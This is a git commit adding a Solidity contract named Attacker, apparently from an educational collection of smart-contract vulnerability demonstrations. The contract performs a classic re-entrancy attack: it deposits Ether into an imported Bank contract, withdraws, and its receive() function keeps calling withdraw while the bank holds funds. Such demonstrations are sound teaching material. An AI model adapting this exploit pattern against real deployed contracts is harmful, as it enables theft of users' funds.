0b1319caa3b9cfcde99009b21b82e7e5fdf7eb85
Kabir Nagpal <149412164+KabirNagpallll@users.noreply.github.com>
2023-12-31 02:40:58 +0530

    Update Re-EntrancyAttacker.sol

--- Vulnerabilities/Re-Entrancy/Re-EntrancyAttacker.sol
+++ Vulnerabilities/Re-Entrancy/Re-EntrancyAttacker.sol
@@ -1,1 +1,26 @@
+pragma solidity ^0.8.17;
+
+import "./Bank.sol";
+
+contract Attacker {
+  Bank public bank;
+  uint256 public initialBalance;
+
+  constructor(Bank _bank) {
+      bank = _bank;
+  }
+
+  function attack() public payable {
+      require(msg.value > 0, "Send some Ether");
+      initialBalance = msg.value;
+      bank.deposit{value: msg.value}();
+      bank.withdraw(initialBalance);
+  }
+
+  receive() external payable {
+      if (address(bank).balance >= initialBalance) {
+          bank.withdraw(initialBalance);
+      }
+  }
+}
 
